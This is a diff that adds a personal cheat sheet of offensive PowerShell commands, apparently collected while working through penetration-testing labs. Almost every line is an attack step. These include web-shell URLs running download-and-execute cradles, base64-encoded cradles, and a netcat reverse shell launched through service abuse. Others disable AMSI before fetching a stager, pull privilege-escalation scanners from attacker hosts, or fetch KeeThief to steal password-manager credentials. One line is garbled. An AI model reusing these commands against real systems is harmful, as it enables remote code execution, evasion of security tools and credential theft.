@@ -1,0 +1,61 @@
+ Set-ExecutionPolicy Unrestricted
+ Set-ExecutionPolicy Unrestricted 
+ 
+ 
+
+(http://10.10.10.167/s_2.php?cmd=powershell
+
+http://10.10.10.167/s_2.php?cmd=powershell -nop -c "IEX(New-Object System.Net.WebClient).DownloadString('http://IP/powercat.ps1')"
+
+"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/GhostPack/KeeThief/master/PowerShell/KeeThief.ps1')"
+
+IEX(New-Object System.Net.WebClient).DownloadString('https://10.10.14.26/powercat.ps1')
+
+http://10.10.10.167/s_2.php?cmd=powershell
+
+http://10.10.10.167/s_2.php?cmd=powershell -nop -c "IEX(New-Object System.Net.WebClient).DownloadString('http://IP/powercat.ps1')"
+
+Invoke-WebRequest -Uri "" -OutFile ""
+
+Invoke-ServiceAbuse -ServiceName 'UsoSvc' -Command 'c:\tmp\nc.exe 10.10.14.201 12 -e cmd'
+
+iwr -uri http -outfile nc ---- -e powershell
+
+cmd.exe /c '\my-app\my-file.bat'
+
+powershell.exe -exec bypass -Command "& {Import-Module .\sher.ps1; Find-AllVulns}
+
+powershell.exe -exec bypass -Command "&{Import-Module .\Sherlock.ps1;Find-AllVulns}"
+
+powershell.exe -exec bypass -Command "&{Import-Module .\PowerUp.ps1;Invoke-AllChecks}"
+
+powershell.exe -nop -exe bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA
+
+
+powershell.exe -nop -exe bypass -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANwAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
+
+
+echo -n "IEX(new-objectv -t utf-16le |base64 -w 0ring('http://10.10.14.27/shell.ps1')" | iconv
+
+
+echo -n "IEX(new-object net.webclient).downloadString('http://10.10.14.7/a.ps1')" | iconv -t utf-16le |base64 -w 0
+
+
+
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($string))
+aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADYALwB0AGUAcwB0AC4AcABzADEAIgApACkA
+PS C:\Users\aitor>
+$string = 'iex ((new-object net.webclient).downloadstring("http://10.10.14.26/amsi-bypass")); if([Bypass.AMSI]::Disable() -eq "0") { iex ((new-object net.webclient).downloadstring("http://192.168.214.129/stager")) }'
+
+c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"
+
+c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
+
+c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"
+
+If you have your ps1 file downloaded to the victim machine then run using this
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+
+c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://ip/pklink.exe' , 'plink.exe')"
